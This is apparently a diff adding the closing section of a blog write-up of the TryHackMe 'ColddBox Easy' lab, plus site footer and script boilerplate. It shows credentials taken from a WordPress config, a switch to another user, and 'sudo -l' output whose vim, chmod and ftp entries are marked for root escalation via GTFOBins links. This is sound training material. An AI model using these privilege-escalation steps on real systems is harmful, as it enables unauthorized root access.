+define('DB_HOST', 'localhost');
+
+{truncated}
+
+define('WP_HOME', '/');
+define('WP_SITEURL', '/');
+
+/** Sets up WordPress vars and included files. */
+require_once(ABSPATH . 'wp-settings.php');
+</code></pre><p>We have credentials for <code>c0ldd</code>!</p>
+<pre><code>www-data@ColddBox-Easy:/var/www/html$ su c0ldd
+su c0ldd
+Password: {i hid this :P}
+
+c0ldd@ColddBox-Easy:/var/www/html$ cd ~
+cd ~
+c0ldd@ColddBox-Easy:~$ sudo -l
+sudo -l
+[sudo] password for c0ldd: {yes I ate this too. Don't judge me ok}
+
+Coincidiendo entradas por defecto para c0ldd en ColddBox-Easy:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+El usuario c0ldd puede ejecutar los siguientes comandos en ColddBox-Easy:
+    (root) /usr/bin/vim
+    (root) /bin/chmod
+    (root) /usr/bin/ftp
+</code></pre><p>We see that we are allowed to run the 3 files as sudo. We use the following respectively for each of the binaries.</p>
+<ol>
+<li><a class="link" href="https://gtfobins.github.io/gtfobins/vim/#sudo"  target="_blank" rel="noopener"
+    >GTFOBins - vim SUDO</a></li>
+<li><a class="link" href="https://gtfobins.github.io/gtfobins/chmod/#sudo"  target="_blank" rel="noopener"
+    >GTFOBins - chmod SUDO</a></li>
+<li><a class="link" href="https://gtfobins.github.io/gtfobins/ftp/#sudo"  target="_blank" rel="noopener"
+    >GTFOBins - ftp SUDO</a></li>
+</ol>
+<p>This completes our room. System FULLY compromised!</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/web-work/">web-work</a>
+        
+            <a href="/tags/cms/">cms</a>
+        
+            <a href="/tags/suid/">suid</a>
+        
+            <a href="/tags/multiple-paths/">multiple-paths</a>
+        
+    </section>
+
+
+    </footer>
+
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+        <h2 class="section-title">Related contents</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="has-image">
+    <a href="/p/tryhackme-mr-robot-writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://i.imgur.com/gsFux0D.png" loading="lazy" data-key="" data-hash="https://i.imgur.com/gsFux0D.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">TryHackMe: Mr Robot Writeup</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/tryhackme-agent-sudo-writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://i.imgur.com/NoIdF01.png" loading="lazy" data-key="" data-hash="https://i.imgur.com/NoIdF01.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">TryHackMe: Agent Sudo Writeup</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/tryhackme-anonymous-writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://i.imgur.com/kd6mc4d.jpg" loading="lazy" data-key="" data-hash="https://i.imgur.com/kd6mc4d.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">TryHackMe: Anonymous Writeup</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/tryhackme-biohazard-writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://i.imgur.com/d7dVxxR.png" loading="lazy" data-key="" data-hash="https://i.imgur.com/d7dVxxR.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">TryHackMe: Biohazard Writeup</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/tryhackme-blog-writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://i.imgur.com/rP25U0x.png" loading="lazy" data-key="" data-hash="https://i.imgur.com/rP25U0x.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">TryHackMe: Blog Writeup</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
+    
+</aside>
+
+
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2021 Tanishq Chaudhary
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="2.3.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                defer="false"
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
